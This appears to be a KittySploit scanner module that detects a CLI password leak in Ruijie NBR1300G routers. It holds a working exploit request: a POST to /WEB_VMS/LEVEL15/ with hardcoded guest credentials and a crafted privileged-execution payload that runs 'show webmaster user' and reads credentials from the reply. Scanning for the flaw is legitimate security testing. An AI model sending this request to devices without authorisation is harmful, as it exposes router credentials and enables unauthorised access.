#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ruijie NBR1300G CLI password leak vulnerability was detected."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ruijie NBR1300G Cli Password Leak - Detect',
        'description': 'Ruijie NBR1300G CLI password leak vulnerability was detected.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'ruijie', 'exposure', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7NBR%201300G%E8%B7%AF%E7%94%B1%E5%99%A8%20%E8%B6%8A%E6%9D%83CLI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html',
            'https://www.ruijienetworks.com',
        ],
    }

    def run(self):
        path = '/WEB_VMS/LEVEL15/'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Authorization': 'Basic Z3Vlc3Q6Z3Vlc3Q='}, data='command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('webmaster level 2 username guest password guest',)
        if any(m in body for m in body_any):
            self.set_info(severity='high', reason='Ruijie NBR1300G Cli Password Leak detected', path=path)
            return True
        return False

